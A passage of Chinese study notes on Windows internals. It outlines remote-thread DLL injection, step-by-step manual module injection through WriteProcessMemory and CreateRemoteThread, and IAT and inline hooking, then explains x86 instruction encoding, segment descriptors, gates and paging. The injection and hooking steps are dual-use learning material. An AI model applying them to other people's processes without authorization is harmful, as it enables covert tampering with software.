LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId ); 创建远程线程时，需要指定进程ID/线程函数/线程函数的参数\nPID的获取 线程函数的地址 等待线程函数结束， 获取线程退出码，即LoadLibrary的返回值，即dll的首地址\n释放为DLL名字申请的空间\n关闭句柄\n如何启动我们想在进程中执行的代码？\n内存写入 步骤：\n获取自身句柄 得到ImageSize的大小，得到模块的ImageBuffer 在当前空间申请空间存放自身代码 拷贝自身到缓存 打开要注入的进程 在远程进程申请空间 对模块中的代码进行重定位 得到模块中要运行的函数的地址 将模块在进程中的地址作为参数传递给入口函数 将修正后的模块，通过WriteProcessMemory写入远程进程的内存空间中 通过CreateRemoteThread启动刚写入的代码 释放内存 模块入口函数执行：\n根据重定位信息，修复IAT表 执行其他功能 通过全局变量来结束这个函数 思路：\n获取自身句柄 得到自己的ImageBase/SizeOfImage 创建一个新的缓冲区，将自己复制进去 打开要注入的进程 在要注入的进程中申请内存，大小就是SizeOfImage 修复自己进程的重定位表 将修复后的数据，复制到要注入的内存中 创建一个远程线程，执行Entry IAT Hook 之前在PE结构中的IAT表（call后面的地址），就是修改IAT表里面的值实现Hook\nInline Hook 其实就是将正常的程序里面修改5字节改为Jmp addr，执行之后再跳回来，需要注意以下：\n细节： 在Jmp到自己的代码后要先保存所有的寄存器的值（pushad pushfd），在执行完成自己的代码后需要恢复所有的寄存器（popad popfd） 在恢复所有的寄存器之后需要执行修改的那5字节的指令，跳转回去则是跳转到修改5字节指令的下一行指令的位置 硬编码 经典定长指令（修改寄存器） 汇编语言格式：\n每一条指令，最短1字节，最长15字节\n背诵：\n鹌鹑蛋别生病，上帝 四零加减一，五零入出栈，九零俺交换 b零移动十六与三二 经典定长指令下(修改EIP) 条件跳转，后跟一个字节立即数的偏移（有符号），共两个字节。\n如果条件成立，跳转到：当前指令地址 + 当前指令长度 + Ib\n最大值：向前跳7f，向后跳80\n0x70 JO 0x71\tJNO 0x72\tJB/JNAE/JC 0x73\tJNB/JAE/JNC 0x74\tJZ/JE 0x75\tJNZ/JNE 0x76\tJBE/JNA 0x77\tJNBE/JA 0x78\tJS 0x79\tJNS 0x7A\tJP/JPE 0x7B\tJNP/JPO 0x7C\tJL/JNGE 0x7D\tJNL/JGE 0x7E\tJLE/JNG 0x7F\tJNLE/JG 哦，不知被谁骗了了 条件跳转，后跟四个字节立即数的偏移（有符号），共五个字节。\n如果条件成立，跳转到：当前指令地址 + 当前指令长度 + Id\n最大值：向前跳7FFFFFFFF，向后跳80000000\n0x0F 0x80 JO 0x0F 0x81\tJNO 0x0F 0x82\tJB/JNAE/JC 0x0F 0x83\tJNB/JAE/JNC 0x0F 0x84\tJZ/JE 0x0F 0x85\tJNZ/JNE 0x0F 0x86\tJBE/JNA 0x0F 0x87\tJNBE/JA 0x0F 0x88\tJS 0x0F 0x89\tJNS 0x0F 0x8A\tJP/JPE 0x0F 0x8B\tJNP/JPO 0x0F 0x8C\tJL/JNGE 0x0F 0x8D\tJNL/JGE 0x0F 0x8E\tJLE/JNG 0x0F 0x8F\tJNLE/JG 其他指令\n0xE0 LOOPNE/LOOPNZ Ib (Jb) 0XE1 LOOPE/LOOPZ Ib (Jb) 0XE2\tLOOP Ib (Jb) 0XE3\tJrCXZ Ib (Jb) (在32位模式中,RCX为ECX) 0xE8\tCALL Id (Jd) 0xE9\tJMP Id (Jd) 0xEA\tJMP Ap （Ap：六字节长度的直接地址）（Jmp far） 0xEB\tJMP Ib (Jb)（Jmp short） 0xC3 RET 0xC2\tRET Iw 0XCB\tRETF （return far） 0xCA\tRETF Iw 经典变长指令（_ModR/M） 先研究一下的指令格式：\n0x88 MOV Eb, Gb\tG：通用寄存器 0x89\tMOV Ev, Gv\tE：寄存器/内存 0x8A\tMOV Gb, Eb\tb：字节 0x8B\tMOV Gv, Ev\tv：Word, doubleword or quadword 当指令中出现内存操作对象的时候，就需要在操作码后面附加一个字节来进行补充说明，这个字节被称为ModR/M。\n该字节的8个位被分成了三部分：\n7 6 5 3 2 0 __________________________________ | Mod | Reg/Opcode | R/M | |_________|_______________|______| 其中，Reg/Opcode（第3、4、5位，共3个字节）描述指令中的G部分，即寄存器。\n寄存器宽度 000 001 010 011 100 101 110 111 32 EAX ECX EDX EBX ESP EBP ESI EDI 8 AL CL DL BL AH CH DH BH Mod（第6、7位）和R/M（第0、1、2位）共同描述指令中的E部分，即寄存器/内存。\n实例：\n当Mod = 11时，ModR/M字节直接操作两个寄存器：\n比如来拆一个：0x88 0x10\n首先确定是MOV Eb, Gb格式 其次0x10 = 0001 0000 = 00 010 000 查表Mod = 00 R/M = 000格式为MOV [EAX], Gb 因为Reg/Opcode = 010格式为MOV [EAX], dl 总结：\nESP指向栈顶，是浮动的，不确定的，英特尔将这个编码废弃，由另外的格式来说明。 EBP指向栈底，而[EBP]通常存储上一个EBP，所以[EBP]无数据操作意义，英特尔将这个编码废弃，改为立即数寻址。 其实这次的指令的源操作数与目标操作数都是一个E，一个G。Reg/Opcode是确定G的，Mod与R/M是确定E的。再看它的指令是b（字节）还是v（Word）（这一步是由机器码确定的0x88就是8位的）。之后再看Mod部分来确定E是寄存器还是内存。 经典变长指令（_SIB字段） ModR/M字段是用来进行内存寻址的，可当地址形如DS:[EAX + ECX*2 + 12345678]时，仅仅靠ModR/M字段，是描述不出来的。这时就在ModR/M后面增加一个SIB字节，与ModR/M字段共同描述。\n在ModR/M字节后，还紧跟着一个SIB字节。SIB字节的8个位被分成了三部分：\n7 6 5 3 2 0 ________________________________ | Scale | Index | Base | |___________|__________|_______| 在例子DS:[EAX + ECX*2 + 12345678]中，Scale描述2^1，Index描述ECX，Base描述EAX，而12345678由ModR/M字段决定。所以SIB字段描述的方式为：Base + Index*2Scale (Scale描述2Scale，所以只能为 *1 *2 *4 *8)\n实例：\n这个[*]在特定情况下会变化，在上面这个例子中是一个32位的偏移。其他的情况：\n如果MOD为00，则[*]命名法表示disp32没有基数。否则，[*]表示disp8或disp32+[EBP]。这提供了以下地址模式： MOD位有效地址\n00：[scaled index] + disp32 01：[scaled index] + disp8 + [EBP] 10：[scaled index] + disp32 + [EBP]\n经典变长指令（_Reg/Opcode） 之前的Mod与R/M之间的Reg/Opcode都是当作寄存器来分析的，但是它还可以标识Opcode\n实例：\n大概就是这样找的了\n指令前缀 段寄存器（后面会很重要）\n段寄存器的作用：早期8086cpu寻址范围小，英特尔遍通过段寄存器来拓展内存，即通过段寄存器基址+偏移的方式来寻址。\n[]中的地址为有效地址（Effect Address），有效地址+段寄存器基址才是实际地址LA（线性地址Line Address）。\n段寄存器本身并不是存储数据的，它里面存储的是一个地址。 这个地址指向了内存中某个段的 起始位置。（微机原理有讲过）\n线性地址 = 段基址 + 有效地址\n在后来的80386时，cpu的寻址范围大大提升，这些段寄存器便被用作了其他用途。但是DS:[]类似这种寻址格式却被保留了下来。\n实际上操作码已经决定了寻址时使用哪个段寄存器作为基址，不需要其他字节描述。规则如下：\n如果没有特别说明，[]前为DS，即DS:[] PUSH POP指令，以及在[]中使用ESP/EBP的，使用SS段 在[Base + Index*2Scale + I]中，以Base为判断条件，没有特别说明，用DS。如果Base为ESP/EBP，则用SS段 串操作指令一般使用ES。MOV ES:[EDI] DS:[ESI]中，目标EDI使用ES段，其他使用DS段 EIP指向当前指令，EIP取指令时使用的是CS段 如果指令加段寄存器前缀，则该条指令一律用这个段，如果加多个段寄存器前缀，默认只看op前的那个 操作指令前缀\n0x66：将操作数改为16字节。\n50\tPUSH EAX 66:50\tPUSH AX 0x67：将操作数改为16字节。（修改默认寻址方式）\n8801 MOV BYTE PTR DS:[ECX],AL 67:8801 MOV BYTE PTR DS:[BX+DI],AL 总结 操作码决定后面有没有ModR/M字段和立即数\nModR/M决定后面有没有SIB字节和偏移\n操作指令中只要包含Ev/Eb，则指令中一定有ModR/M字节\n只需要把操作码确定下来，那么后面有什么字段，就都能确定了。即一切由操作码决定。\n操作码长度：\n一个字节：00 - FF（TableA-2 0F除外）\n两个字节：0F 00 - 0F FF（TableA-3）\n三个字节：0F 38 / 0F 3A （TableA-3 TableA-4 TableA-5）"},"title":"Windows BEG"},"/docs/windows/windows-ext/":{"data":{"":"","#":"保护模式 保护模式概述 ‍保护模式分为段机制和页机制。\n理解：想象一下你家的电脑就像一个大厨房，里面有很多小帮手在做不同的事情，比如煮汤、炒菜等等。保护模式就是为了保证这个大厨房的秩序和安全。首先，保护模式就像是给每个小帮手配了一套专属的工具，他们不能随便用别人的工具，也不能乱碰别人的食材。这样做的好处是，即使其中一个小帮手犯错了，也不会影响到其他小帮手(防止一个进程访问或修改另一个进程的内存数据)。其次，保护模式给了每个小帮手一个身份证，分成两类：一类是高级厨师，一类是普通厨师。高级厨师有更多的权限，可以做更多的事情，比如烧开水等。而普通厨师的权限就少一些，不能做一些危险的事情。这样可以防止有人乱来，比如一个不懂规矩的小帮手想烧开水，但是他只是个普通厨师，就不能执行这个操作(内核模式具有更高的特权级别，可以执行更多的操作，而用户模式受到更多的限制)。再来，保护模式还给了每个小帮手一个梦幻厨房，虽然实际上只有一个大厨房，但是每个小帮手都觉得自己有一个属于自己的梦幻厨房。这样就不会出现争抢厨房的情况，大家都可以安心做自己的事情(操作系统可以为每个进程提供虚拟内存，使得每个进程都认为自己拥有连续的内存空间)。最后，保护模式还让这些小帮手轮流工作，每个人都有自己的时间段做事情，不会出现一个人霸占厨房不肯给别人机会的情况，这样大家都有机会工作，效率也更高(操作系统可以同时运行多个进程，并实现进程之间的时间片轮转调度，使得多个程序可以并发执行)。\n段寄存器结构 段寄存器一共有CS SS DS ES FS GS LDTR TR 共8个。\n当我们用汇编读写某一个地址时：\nmov dword ptr ds:[0x123456],eax 我们真正读写的地址是：\nds.base+0x123456 段寄存器结构体如下：\nstruct Segment { WORD Selecter; //16位段选择子 可见部分. 使用OD 或者X64dbg看段寄存器只会显示16位的段选择子可见部分. WORD Attribute; //16位表示的段属性, 表示了当前段寄存器是可读的可写的还是可执行的 DWORD Base; //32位表示的基址,表示段从哪里开始 DWORD limit; //32位表示,表示的是基址的长度. base + limit 可以确定一个段的大小 } 结构如下图：\n[---------------------------------\u003e 可见部分 \u003c-----------------------------------------] [--\u003e不可见部分\u003c---] +--------------------------------------------------------------------------------------------------------+ |\t|\t|\t|\t| |\t|\t|\t|\t| |\t|\t|\t|\t| |\t|\t|\t|\t| +--------------------------------------------------------------------------------------------------------+ ^\t^\t^\t^ |\t|\t|\t| |\t|\t|\t| 32位Base\t32位limit\t16位Attribute\t16位Selecter 段寄存器属性如下：\n寄存器名称 段选择子(Select) 段属性(Attributes) 段基址(Base) 段长(Limit) ES(附加扩展段) 0x0023 可读,可写 0x0000000 0xFFFFFFFF CS(代码段) 0x001B 可读,可执行 0x00000000 0xFFFFFFFF SS(堆栈段) 0x0023 可读,可写 0x00000000 0xFFFFFFFF DS(数据段) 0x0023 可读,可写 0x00000000 0xFFFFFFFF FS(分段机制) 0x003B 可读,可写 0x7FFDF000 0xFFF GS(额，64位系统好像使用吧) 未使用 未使用 未使用 未使用 段描述符与段选择子 GDT(全局描述符表) LDT(局部描述符表)\n当我们执行类似MOV DS,AX指令时，CPU会查表，根据AX的值来决定查找GDT还是LDT，查找表的什么位置，查出多少数据。(AX就是可见的Selector段选择子的内容)\nGDTR(48位寄存器，表中存放了GDT表 的起始地址(32位)，外加存放GDT表的大小(16位))\n段描述符(8字节一组，64位)结构（记住结构）\nAVL: 该位是用户位，可以被用户自由使用 BASE: 段基址，由上图中的两部分(BASE 31-24 和 BASE 23-0(图错了))组成 D/B: 该位为 0 表示这是一个 16 位的段，1 表示这是一个 32 位段 DPL：段权限 G：LIMIT的单位，该位 0 表示单位是字节(0xfffff)，1表示单位是 4KB(0xffffffff) LIMIT: 段的界限，单位由 G 位决定。数值上（经过单位换算后的值）等于段的长度（字节）- 1。 P: 段存在位，该位为 0 表示该段不存在，为 1 表示存在。 S: 该位为 1 表示这是一个数据段或者代码段。为 0 表示这是一个系统段（比如调用门，中断门等） TYPE: 根据 S 位的结果，再次对段类型进行细分。 段选择子（2字节，16位）\n段选择子是一个16位的段描述符，该描述符指向了定义该段的段描述符。\n说明： MOV DS，AX指令时， 假如AX=1B，即001B，拆分为0000 0000 0001 1011\n去掉TI和RPL值，后剩下Index值为11，即3，则查GDT表索引值为3 （GDT表中索引值从0开始，索引值为0处的段描述符为0）的段描述符。\n加载段描述符至段寄存器\n除了MOV指令,我们还可以使用LES、LSS、LDS、LFS、 LGS指令修改寄存器。(L是Load的意思)\nCS不能通过上述的指令进行修改，CS为代码段，CS的改变会导致EIP的改变，要改CS，必须要保证CS与EIP一起改。\nchar buffer[6]; asm{ les ecx,fword ptr ds:[buffer] //高2个字节给es,低四个字节给ecx } //es也就是上面的段选择子，用00补全成4位，然后拆分…… 注意: RPL\u003c=DPL(在数值上)\t(以什么样的权限去访问段)\n段描述符的属性 P: 段存在位，该位为 0 表示该段不存在，为 1 表示存在。(CPU后面就不检查别的位了)\nLIMIT: 段的界限，单位由 G 位决定。数值上（经过单位换算后的值）等于段的长度（字节）- 1。\nAttribute //16位 对应段描述符（高四字节） 第8位~第23位\nBase //32位 （高四字节）第24位 ~ 第31位 + （高四字节）第0位 ~ 第7位+（低四字节）第16位 ~ 第31位\nLimit //32位 （高四字节）第16位 ~ 第19位 +（低四字节）第0位 ~ 第15位 总共20位 最大值也就是FFFFF，此时分情况 1.如果G位为0，那么Limit单位是字节，此时高位填0,即最大值也就是0x000fffff 2.如果G位为1，那么Limit单位是4KB，4x1024=4096,4096代表有多少个，但是地址计算都是从0开始的，那么需要减1，即上限为4096-1=4095,刚好转为0xfff，如果此时Limit界限为1的话，那么此时为0x1FFF，则最大可以为0xffffffff\n不理解：如果粒度 G=0，LIMIT= 0x3ff，这意味着该段的大小是 0x3ff+1=0x400 字节。如果 G=1，那意味着该段的大小是(0x3ff+1)*4KB=0x400000字节，所以换算后的 limit = 0x400000-1=0x003fffff.\n再举个例子。LIMIT=0xfffff, G=1,则该段的大小是 (0xfffff+1)*4KB=0x100000*0x1000=0x100000000字节，所以换算后的 limit=0x100000000-1=0xffffffff\n狗多半零安，乐，破地皮两树，停\n总结： 如果 G = 0，把段描述符中的 20 bit LIMIT取出来，比如 0x003ff，然后在前面补 0 至32bit，即 limit = 0x000003ff 如果 G = 1，把段描述符中的 20 bit LIMIT取出来，比如 0x003ff，然后在后面补 f 至 32bit, 即 LIMIT = 0x003fffff S: 该位为 1 表示这是一个数据段或者代码段。为 0 表示这是一个系统段（比如调用门，中断门等）\n额我们先找数据段或者代码段，s位的不同会导致TYPE域发生变化。这张图是TYPE域满足什么条件下是数据段或代码段：\n因为DPL的值只可能是全1或全0，所以16~12位如果是数据段或代码段的话只能为f(1111)或9(1001)。那么在段描述符中找第五位，如果是f或9就是数据段或代码段。 因为TYPE域的第11位只可能是1或0，而且全为1是代码段；全为0是数据段。那么第六位大于8就是代码段，小于8就是数据段。 来看数据段的标志位：\nE：如果为1，表示向下扩展(右图)；E=0，表示向上扩展(左图)，windows只使用向上扩展，也就是E为0 W：如果为1，代表该数据段描述符是可写的 A：如果为1，代表该数据段描述符已经被访问过了 来看代码段的标志位：\nC：如果为1，表示一致代码段；如果为0，表示非一致代码段 R：如果为1，表示可读；如果为0，表示不可读 A：如果为1，表示段曾被访问；如果为0，表示段未被访问 系统段描述符(就是s为0的情况)如下图：\nDB位的影响大致如下：\n情况一：对CS段的影响\nD=1 采用32位寻址方式\nD =0 采用16位寻址方式\n前缀67 改变寻址方式\n情况二：对SS段的影响(这个隐式大概就是间接操作栈的指令，不像mov指令这样直接控制esp或ebp)\nD=1 隐式堆栈访问指令(如: PUSH POP CALL)使用32位堆栈指针寄存器ESP D=0 隐式堆栈访问指令(如:PUSH POP CALL)使用16位堆栈指针寄存器SP 情况三：向下拓展的数据段\nD=1段上线为4GB D=0段上线为64KB 段权限检查 cpu的分级：\n如何查看程序处于几环：\nCPL(Current Privilege Level)：当前特权级(是几程序就在几环) CS和SS中存储的段选择子后2位.(二者相同的都是CPL) DPL(Descriptor Privilege Level)描述符特权级别：\nDPL存储在段描述符中，规定了访问该段所需要的特权级别是什么。\n通俗的理解：如果你想访问我，那么你应该具备什么特权。\n举例说明：\nmov DS,AX 如果AX指向的段DPL=0但当前程序的CPL=3这行指令是不会成功的!\nRPL(Request Privilege Level)请求特权级别举例说明：\n通俗的理解：当前段选择子的权限\n比较mov ax,0008与mov ax,000B并且之后均执行mov ds,ax的区别\n(区别是8的二进制为1000，B的二进制为1011，无别就在于最后的两位所代表的RPL不同)\n将段描述指向的是同一个段描述符，但RPL是不一样的.\n数据段的权限检查参考如下代码:\n比如当前程序处于0环,也就是说CPL=0\nmov ax,000B\t//1011也就是RPL = 3 mov ds,ax\t//ax指向的段描述符的DPL = 0 数据段的权限检查：\nCPL \u003c= DPL 并且 RPL \u003c= DPL (数值E8比较)\n注意：代码段和系统段描述符中的检查方式并不一样。\n总结一下：\nCPL -\u003e CPU当前的权限级别 DPL -\u003e 如果你想访问我,你应该具备什么样的权限 RPL -\u003e 用什么权限去访问一个段(比如高权限可以用低权限访问) 为啥要有RPL? 我们本可以用“读 写”的权限去打开一个文件，但为了避免出错，有些时候我们使用“只读”的权限去打开。就是限制程序权限的使用，尽量规避提权漏洞(吧)。 代码的跨段跳转流程 本质就是修改cs寄存器\n代码间的跳转(段间跳转 非调用门之类的)\n段间跳转有2种情况,即要跳转的段是一致代码段还是非一致代码段。\n同时修改CS与EIP的指令JMP FAR / CALL FAR / RETF / INT / IRETED\n注意：只改变EIP的指令JMP / CALL / JCC / RET\n远跳(jmp far)的执行流程\njmp 0x20:0x004183D\n将前面的段寄存器拆成段选择子：\n0x20对应二进制形式 0000 0000 0010 0000 RPL=00 TI=0 Index=4 因为TI=0，所以要查GDT表，找对应Index的段描述符\n这四种情况可以跳转：代码段、调用门、TSS任务段、任务门\n权限检查\n如果是非一致代码段，要求：CPL == DPL 并且 RPL \u003c= DPL\n如果是一致代码段，要求：CPL\u003e= DPL\n解释一下：假设我可以用不同的权力去控制别人，我自己的权力和我所使用的权力会有区别。(权限越高越小)\nCPL == DPL：我可以控制与自己的权力一样的人。 RPL \u003c= DPL：我所使用大的权力，自然的可以控制权力比我小的人。 CPL \u003e= DPL：我自己的权力小于别人的权力。 总结：\n对于一致代码段:也就是共享的段\n特权级高的程序不允许访问特权级低的数据:核心态不允许访问用户态的数据 特权级低的程序可以访问到特权级高的数据,但特权级不会改变：用户态还是用户态 对于普通代码段:也就是非一致代码段\n只允许同级访问 绝对禁止不同级别的访问:核心态不是用户态,用户态也不是核心态. 直接对代码段进行JMP或者CALL的操作，无论目标是一致代码段还是非一致代码段, CPL都不会发生改变。如果要提升CPL的权限，只能通过调用门。\n加载段描述符\n通过上面的权限检查后，CPU会将段描述符加载到CS段寄存器中。\n代码执行\nCPU将 CS.Base + Offset (就是冒号后面的值)的值写入EIP 然后执行CS:EIP处的代码，段间跳转结束。\n总结：\n为了对数据进行保护,普通代码段是禁止不同级别进行访问的。用户态的代码不能访问内核的数据,同样,内核态的代码也不能访问用户态的数据。 如果想提供一些通用的功能，而且这些功能并不会破坏内核数据，那么可以选择一致代码段,这样低级别的程序可以在不提升CPL权限等级的情况下即可以访问。 如果想访问普通代码段,只有通过’调用门’等提示CPL权限,才能访问。 长调用与短调用 短调用：\n指令格式：call 立即数 / 寄存器 / 内存 把call当前地址的下一个地址入栈，然后将eip跳到call后面跟的地址。执行到ret后返回(到入栈的地址) 发生改变的寄存器: esp eip 长调用(跨段不提权)：\n指令格式: CALL CS:EIP (EIP是废弃的)\n先入栈调用者的CS段选择子，再把当前地址的下一个地址入栈(返回地址)\n执行前 执行后 返回地址 调用者的CS段选择子 xxxxxxxx xxxxxxxx 发生改变的寄存器: ESP EIP CS\n长调用(跨段提权)：\n指令格式: CALL CS:EIP (EIP是废弃的)\n执行前的栈是3环的栈，执行后是0环的栈(CPL)，所以是在0环的栈里面压入的一系列参数。\n执行前(在3环) 执行后(在0环) 返回地址 调用者CS 调用者ESP 调用者SS xxxxxxxx xxxxxxxx 总结：\n跨段调用时，一旦有权限切换，就会切换堆栈。 CS的权限一旦改变，SS的权限也要随着改变，CS与SS的等级必须一样。 JMP FAR只能跳转到同级非一致代码段，但CALL FAR可以通过调用门提权，提升CPL的权限。 调用门 门描述符是系统段描述符的一类。所以门描述符S=0，TYPE=1100\n所以如下：\n0000 0000 0000 0000 -\u003e Offset 1110 -\u003e P、DPL、S 1100 -\u003e Type 0000 0000 -\u003e 0 - 7位 0x0000EC00 低32位段选择子可以设为0x0008（对应0环代码段）、0x001B（对应3环代码段） 0x00080000 加上偏移就可以使用了 调用门执行流程\n指令格式：CALL CS:EIP(EIP是废弃的)\n执行步骤：\n根据CS的值查GDT表，找到对应的段描述符这个描述符是一个调用门。 在调用门描述符中存储另一个代码段的选择子。 选择子指向的段 段.Base+ 偏移地址 就是真正要执行的地址。、 结构说明：\n字段 内容 offset in segment 要跳转的函数的地址，或者是要跳转的地址 (两段组成了32位的地址，前高位后低位) segment selector 段选择子，要变成的段选择子（提权的关键） Param Count 函数参数个数 高位5-7 固定的三个0 Type 系统段只能是1100（10进制的12） 高12地址 就是段描述符的S字段，就系统调用的必须是0 DPL 肯定赋值为3呀，这样ring3才能。 p 和段描述符一样表示该段是否有效，当P为0时无效，1时有效。 调用门总结：\n当通过门，权限不变的时候，只会PUSH两个值: CS返回地址新的CS的值由调用门决定。 当通过门，权限改变的时候，会PUSH四个值：SS ESP CS 返回地址 新的CS的值由调用门决定 新的SS和ESP由TSS提供。 通过门调用时，要执行哪行代码有调用门决定，但使用RETF返回时，由堆栈中压人的值决定，这就是说，进门时只能按指定路线走，出门时可以翻墙（只要改变堆栈里面的值就可以想去哪去哪）。 可不可以再建个门出去呢？也就是用Call 当然可以了 前门进 后门出。 中断门 Windows没有使用调用门，但是使用了中断门：\u003c1\u003e 系统调用\t\u003c2\u003e 调试\n调用门会去查GDT表，中断门却回去查IDT表(中断描述符表)。\nIDT即中断描述符表，同GDT一样，IDT也是由一系列描述符组成的，每个描述符占8个字节。但要注意的是，IDT表中的第一个元素不是NULL。\nIDT表可以包含3种门描述符:\t任务门描述符\t中断门描述符\t陷阱门描述符\n指令格式：INT N (N为中断门索引号)\n中断门如下：（图中的D表示是否为32位，如果是则为1）\n与调用门类似会产生如下的情况：\n在没有权限切换时，会向堆栈顺次压入EFLAG、CS和EIP；如果有权限切换，会向堆栈顺次压入SS、ESP、EFLAG、CS和EIP。 CPU会索引到IDT表。后面的N表示查IDT表项的下标。对比调用门，中断门没有了RPL，故CPU只会校验CPL。 在中断门中,不能通过RETF返回，而应该通过IRET/IRETD指令返回。 陷阱门 陷阱门的结构和中断门结构几乎一样，只是Type域不同而已（图中的D表示是否为32位，如果是则为1）\n与中断门的区别，中断门执行时，将IF位清零,但陷阱门不会。\n解释：如果IF位为零，则不再接收可屏蔽中断。\n可屏蔽中断就像是你房间里的门铃，你可以选择要不要打开门去接待访客。 不可屏蔽中断就像是火警响了，这是一个紧急情况，你不能选择不管它。 任务段 我们回顾一下之前所学内容，在调用门、中断门与陷阱门中，一旦出现权限切换，那么就会有堆栈的切换。而且，由于CS的CPL发生改变，也导致了SS也必须要切换。切换时，会有新的ESP和SS从哪里来的呢？那就是任务状态段提供的。任务状态段简称任务段，英文缩写为TSS，Task-state segment。\nTSS是一块内存，大小为104字节，内存结构如下图所示：\nTSS 的作用\nIntel的设计TSS目的，用官方的话说就是实现所谓的任务切换。CPU的任务在操作系统的方面就是线程。任务一切换，执行需要的环境就变了，即所有寄存器里面的值，需要保存供下一次切换到该任务的时候再换回去重新执行。 说到底，TSS的意义就在于可以同时换掉一堆寄存器。本质上和所谓的任务切换没啥根本联系。而操作系统嫌弃Intel的设计过于麻烦，自己实现了所谓的任务切换，即线程切换。(应该有点像srop的感觉吧)\nCPU 如何找到 TSS\nTSS是一个内存块，并不在CPU中，那么它是怎样找到正确的TSS呢？那就是之前提到的TR段寄存器，而TR寄存器里面的值是从段描述符里面加载的，也就是从GDT表里面的TSS段描述符加载的。CPU通过TR寄存器索引TSS是示意图如下图所示：\nTSS段描述符\nTSS段描述符的结构和普通的段描述符没啥区别，就是系统段描述符，如果Type为9(B=0 1001)，则这个TSS段描述符没有加载到TR寄存器中，如果Type为B(B=1 1011)，就是加载了，如下图所示：\nTR寄存器读写\n加载TSS 指令：LTR 说明：用LTR指令去装载，仅仅是改变TR寄存器的值（96位），并没有真正改变TSS。LTR指令只能在系统层使用，加载后TSS段描述符会状态位会发生改变。 读取TR寄存器 指令：STR 说明：如果用STR去读的话，只读了TR的16位，即选择子。 修改TR寄存器途径\n在0环可以通过LTR指令去修改TR寄存器。 在3环可以通过CALL FAR或者JMP FAR指令来修改。用JMP去访问一个任务段的时候，如果是TSS段描述符，先修改TR寄存器，在用TR.Base指向的TSS中的值修改当前的寄存器。 任务门 IDT 中断描述符表:\nIDT表可以包含3种门描述符：任务门描述符\t中断门描述符\t陷阱门描述符\n任务门结构:\n执行过程：\n通过INT N的指令进行触发任务门 查IDT表，找到任务门描述符 通过任务门描述符，查GDT表，找到TSS段描述符 使用TSS段中的值修改TR寄存器 IRETD返回 10-10-12分页 虚拟地址空间是什么？\n每个进程都有一个“假想的”内存空间，大小是4GB。这并不是说每个进程都真的占用了4GB的内存，而是操作系统为每个进程提供了一个这样的“地址地图”。可以把它看作是一个巨大的图书馆目录，这个目录告诉进程可以在这些地址上“存放”数据。\n这些虚拟地址就像地图上的标记，它们并不直接对应计算机硬件中的实际内存位置。实际的物理内存地址是计算机真正用来存储数据的地方。可以把物理地址想象成图书馆中的实际书架位置。\n一个进程都有4GB的虚拟地址空间，它们并不是真正的地址，而是个索引。它通过某种方式进行转换，从而指向真正的物理地址：\n如下指令：\nMOV eax,dword ptr ds:[0x12345678]\n其中，0x12345678 是有效地址，ds.Base + 0x12345678是线性地址\n解释：这个线性地址实际上是不存在的，在执行时CPU会将线性地址转化为物理地址\n10-10-12拆分：假设我们有一个32位的虚拟地址。10-10-12拆分是把这个32位的地址分成三个部分，前10位中间10位和后12位\nCPU得到线性地址之后经过10-10-12拆分成三份去找物理地址，CPU会去找CR3寄存器，CR3寄存器里面存的地址指向一个4kb的页这就是它的第一级，拆分的第一个10位决定了在第一级中的什么位置；这个位置里面的值又指向一个4kb的页这就是它的第二级，拆分的第二个10位决定了在第二级中的什么位置，而第三个12位决定了在物理页中的什么位置。\n每个进程都有一个CR3，准确的说是都一个CR3的值。CR3本身是个寄存器，一核一套寄存器。CR3里面放的是一个真正的物理地址，指向一个物理页，一共4096字节，如下图所示：\n对于10-10-12分页来说，线性地址对应的物理地址是有对应关系的，它被分成了三个部分，每个部分都有它具体的含义。线性地址分配的结构如下图所示：\n第一个部分指的是PDE在PDT的索引，第二部分是PTE在PTT的索引，第三个部分是在PTE指向的物理页的偏移。PDT被称为页目录表，PTT被称为页表。PDE和PTE分别是它们的成员，大小为4个字节。接下来将详细介绍每一个部分是咋用的。\nPDE与PTE 分页并不是由操作系统决定的，而是由CPU决定的。只是操作系统遵守了CPU的约定来实现的。物理页是什么？物理页是操作系统对可用的物理内存的抽象，按照4KB的大小进行管理（Intel是按照这个值做的，别的CPU就不清楚了），和真实硬件层面上的内存有一层的映射关系，这个不是保护模式的范畴，故不介绍。\nPDE与PTE属性 物理页的属性 = PDE属性 \u0026 PTE属性\n9~12位（缺页异常）\n内存紧张时，当CPU发现某一线性地址访问频率不是特别高时，操作系统就会把这个地址的内容存到文件里面，并且将P位置0。 当CPU访问一个地址，如果其PTE的P位为0，此时会产生缺页异常。（此时走e号中断） G位\n​\t如果G位为1刷新TLB时将不会刷新PDE/PTE的G位为1的页，G=1切换进程该PTE扔然有效(这里学完TLB才能明白)\n(PDE)PS位\n这个位只对PDE有意义。如果PS == 1，则PDE直接指向物理页（高20位就是物理页），不再指向PTE，10-10-12的低22位是页内偏移。它的大小为4MB，俗称“大页”。\n(PTE)D 位\n脏位，指示是否被写过。若没有被写过为0，被写过为1。\nA 位\n是否被访问，即是否被读或者写过，如果被访问过则置1。即使访问了一字节也是1。\nR/W 位\n如果R/W = 0，表示是只读的，反之为可读可写。\nU/S 位\n如果U/S = 0，则为特权用户（super user），即非3环权限。反之，则为普通用户，即为3环权限。\nP 位\n表示PDE或者PTE是否有效，如果有效为1，反之为0。\n页目录表基址 如果系统要保证某个线性地址是有效的，必须为其填充正确的PDE与PTE，如果我们想填充PDE与PTE那么必须能够访问。有的人会想，直接拿CR3去填写就行了，还需要页目录表基址干嘛？操作系统只能用线性地址，不能用物理地址。CR3存储的是物理地址，这个是给CPU看的，不是给操作系统看的。操作系统访问它就必须知道它的线性地址才行。CPU可不帮我们挂物理页，它做不到这点，只能提供要求标准，而操作系统按照标准进行办事。于是乎页目录表基址与页表基址这两个东西就出现了。\n通过页目录表基址，操作系统可以帮我们程序挂上正确的PDE，通过页表基址挂上正确的PTE，然后指向正确的物理页。\n通过0xC0300000找到的物理页就是页目录表，这个物理页即是页目录表本身也是页表 页目录表是一张特殊的页表，每一项PTE指向的不是普通的物理页，而是指向其他的页表 结论：0xC0300000存储的值就是PDT，如果我们要访问第N个PDE，那么有如下公式:0xC0300000 +N*4 0xC0300000 1100 0000 00|11 0000 0000 000 1：1100 0000 00 == 300*4 2：1100 0000 00 == 300*4 3：0 页表基址 仅仅知道页目录表基址只能访问一个线性地址的PDE。但是PTE我们没办法知道（因为如果程序使用页目录表基址是没办法访PTE的）。与页目录表基址类似，通过页表基址就可以访问PTT，也就是地址0xC0000000。\n页表被映射到了从0xC0000000到0xC03FFFFF的4M地址空间 在这1024个表中有一张特殊的表：页目录表 页目录被映射到了0xC0300000开始处的4K地址空间 